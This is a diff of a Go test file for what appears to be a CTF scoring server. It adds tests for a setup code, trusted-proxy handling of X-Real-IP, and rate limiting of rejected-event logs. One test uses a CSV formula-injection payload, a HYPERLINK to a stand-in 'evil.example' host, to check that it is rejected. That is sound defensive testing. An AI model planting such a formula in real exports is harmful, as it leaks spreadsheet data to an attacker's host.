@@ -22,6 +22,7 @@ import (
 	"time"
 
 	"github.com/macsnoeren/juiceshop-ctf/internal/central/store"
+	"github.com/macsnoeren/juiceshop-ctf/internal/httpx"
 	"github.com/macsnoeren/juiceshop-ctf/internal/protocol"
 	"github.com/macsnoeren/juiceshop-ctf/web/static"
 )
@@ -63,7 +64,7 @@ func (e *env) setup(user, pw string) *httptest.ResponseRecorder {
 	if m == nil {
 		e.t.Fatal("no CSRF token on the setup page")
 	}
-	form := url.Values{"csrf": {m[1]}, "username": {user}, "password": {pw}, "password2": {pw}}
+	form := url.Values{"csrf": {m[1]}, "setup_code": {e.srv.SetupCode()}, "username": {user}, "password": {pw}, "password2": {pw}}
 	w := e.req("POST", base+"/admin/setup", strings.NewReader(form.Encode()), "Content-Type", "application/x-www-form-urlencoded")
 	if w.Code != http.StatusSeeOther {
 		e.t.Fatalf("setup: %d %s", w.Code, w.Body.String())
@@ -86,7 +87,9 @@ func newBareEnv(t *testing.T) *env {
 	}
 	t.Cleanup(func() { st.Close() })
 	st.SaveSettings(store.Settings{Title: "Juice Shop CTF", Timezone: "UTC", RetentionDays: 30})
-	srv, err := New(Config{BasePath: base}, st, slog.New(slog.NewTextHandler(io.Discard, nil)))
+	// The test requests come from 192.0.2.7 (see req), standing in for the
+	// reverse proxy in front: its X-Real-IP counts.
+	srv, err := New(Config{BasePath: base, TrustedProxies: httpx.MustProxies("192.0.2.0/24")}, st, slog.New(slog.NewTextHandler(io.Discard, nil)))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -253,6 +256,60 @@ func TestLegacyReportIsGone(t *testing.T) {
 	evs := e.events(store.EvLegacy)
 	if len(evs) != 1 || evs[0].Address != "198.51.100.9" || !strings.Contains(evs[0].Text, "lab-1") {
 		t.Errorf("legacy events %+v", evs)
+	}
+}
+
+// ---- an address is the peer's unless a trusted proxy names one ----
+
+func TestClientAddress(t *testing.T) {
+	legacy := func(e *env, hdr ...string) string {
+		e.t.Helper()
+		e.req("POST", base+"/api/v1/report", strings.NewReader(`{}`), hdr...)
+		evs := e.events(store.EvLegacy)
+		return evs[0].Address
+	}
+	// A trusted proxy (the test peer): a valid X-Real-IP counts...
+	e := newEnv(t)
+	if a := legacy(e, "X-Real-IP", "2001:db8::1"); a != "2001:db8::1" {
+		t.Errorf("trusted, valid: %q", a)
+	}
+	// ...anything else in it does not, and never reaches the CSV.
+	formula := `=HYPERLINK("https://evil.example/?"&A2,"details")`
+	if a := legacy(e, "X-Real-IP", formula); a != "192.0.2.7" {
+		t.Errorf("trusted, not an IP: %q", a)
+	}
+	if csv := e.get(base + "/admin/events.csv").Body.String(); strings.Contains(csv, "HYPERLINK") {
+		t.Errorf("a formula in the CSV:\n%s", csv)
+	}
+	// From a peer that is no proxy, the header is the client's word: ignored.
+	st, _ := store.Open(filepath.Join(t.TempDir(), "central.db"))
+	defer st.Close()
+	srv, _ := New(Config{BasePath: base, TrustedProxies: httpx.MustProxies("none")}, st, slog.New(slog.NewTextHandler(io.Discard, nil)))
+	f := &env{t: t, st: st, srv: srv, now: t0, jar: map[string]string{}, h: srv.Handler()}
+	if a := legacy(f, "X-Real-IP", "198.51.100.9"); a != "192.0.2.7" {
+		t.Errorf("untrusted peer: %q", a)
+	}
+	if srv.secure(httptest.NewRequest("GET", "/", nil)) {
+		t.Error("X-Forwarded-Proto believed without a proxy")
+	}
+}
+
+// ---- requests from anybody cannot flood the event feed ----
+
+func TestRejectedEventsAreLimited(t *testing.T) {
+	e := newEnv(t)
+	for i := 0; i < RejectedEventsPerMinute+20; i++ {
+		e.req("POST", base+"/api/v2/report", strings.NewReader("{}"), "Authorization", "Bearer nonsense")
+	}
+	if n := len(e.events(store.EvRejected)); n != RejectedEventsPerMinute+1 {
+		t.Errorf("%d rejected events, want %d and one line about the rest", n, RejectedEventsPerMinute+1)
+	}
+	// Another address has its own budget, and the next minute a new one.
+	e.req("POST", base+"/api/v2/report", strings.NewReader("{}"), "Authorization", "Bearer nonsense", "X-Real-IP", "198.51.100.1")
+	e.now = e.now.Add(time.Minute)
+	e.req("POST", base+"/api/v2/report", strings.NewReader("{}"), "Authorization", "Bearer nonsense")
+	if n := len(e.events(store.EvRejected)); n != RejectedEventsPerMinute+3 {
+		t.Errorf("%d rejected events after a new address and a new minute", n)
 	}
 }
 
